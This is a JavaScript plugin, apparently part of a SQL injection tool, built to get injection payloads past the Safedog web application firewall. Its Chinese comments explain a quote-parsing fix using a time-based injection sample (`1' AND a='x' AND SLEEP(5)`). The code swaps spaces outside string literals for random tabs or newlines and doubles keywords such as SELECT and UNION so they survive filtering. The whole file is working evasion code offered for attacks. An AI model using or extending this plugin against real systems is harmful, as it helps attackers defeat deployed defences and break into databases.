// safedog.js — 针对 安全狗 (Safedog) WAF 的绕过插件
// 策略：tab+newline 混合替代空格 + 假 cookie 填充 + 关键字双写
//
// [2026-10-05] 引号处理改用 quoteScan 单一真源。修了两个独立缺陷：
//
// ① 转义奇偶性：原写法 `s[i-1] !== '\\'` 问的是"前一个字符是不是反斜杠"，
//    而正确判据是**连续反斜杠的奇偶性** —— 'a\' 的末位引号被转义（未闭合），
//    'a\\' 的未转义（闭合）。inQuote 是状态变量，判错就永不复位 ⇒ 该引号之后
//    所有字符都不再进入空格替换分支，而空格替换正是本插件的核心功能。
//
// ② 开/闭引号不分（更要命，且与转义无关）：原实现"遇到引号就切换状态"，
//    隐含假设引号成对交替。但最常见的注入形态恰恰不是这样：
//      `1' AND a='x' AND SLEEP(5)` —— 位置 1 是注入点开引号，位置 9 是字面量闭引号。
//    状态机在 1 开、9 "闭"，于是 a= 被吞、位置 11 又"开" ⇒ 此后 AND SLEEP
//    全在字面量里，**空格替换完全不生效**（实测 300 次替换 0 个空格）。
//    改用 splitByLiteral 的段序列，段奇偶天然表达开/闭。
import { splitByLiteral } from '../quoteScan.js';
export const safedog = {
  name: 'safedog',
  description: '针对 安全狗 WAF：tab+newline 混合空格 + 关键字双写（SELECT→SELSELECTECT）',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    let s = String(payload ?? '');
    // 1) 空格 → \t 或 \n 随机
    //
    // [2026-10-05 第二个缺陷，与转义无关] 原实现"遇到引号就切换 inQuote"，
    // 隐含假设引号总是成对交替。但**最常见的注入 payload 恰恰不是**：
    //   `1' AND a='x' AND SLEEP(5)`
    //        ^注入点开引号        ^字面量闭引号
    // 位置 1 的引号开、位置 9 的引号"闭"（把 a='x 的内容当字面量吞掉），
    // 位置 11 的引号又"开" ⇒ 此后整段（含 AND SLEEP）被当成字面量，
    // 空格替换（本插件的核心功能）**完全不生效**。
    //
    // 修法：改用 quoteScan.splitByLiteral 做真正的字面量识别 ——
    // 段序列的奇偶性天然表达了"开/闭"，不必自己维护易错的状态机。
    const chars = [];
    for (const seg of splitByLiteral(s, "'")) {
      if (seg.kind === 'text') {
        for (const c of seg.text) {
          chars.push(c === ' ' ? (Math.random() > 0.5 ? '\t' : '\n') : c);
        }
      } else {
        // 字面量内容（含首尾引号）原样保留；未闭合也原样（不能截断）
        chars.push("'" + seg.text + (seg.closed ? "'" : ''));
      }
    }
    s = chars.join('');
    // 2) 关键字双写（SELECT → SELSELECTECT, UNION → UNUNIONION）
    const doubleMap = { SELECT: 'SELSELECTECT', UNION: 'UNUNIONION', WHERE: 'WHWHEREERE', FROM: 'FRFROMOM' };
    for (const [kw, replacement] of Object.entries(doubleMap)) {
      const re = new RegExp(`\\b${kw}\\b`, 'gi');
      s = s.replace(re, replacement);
    }
    return s;
  },
};
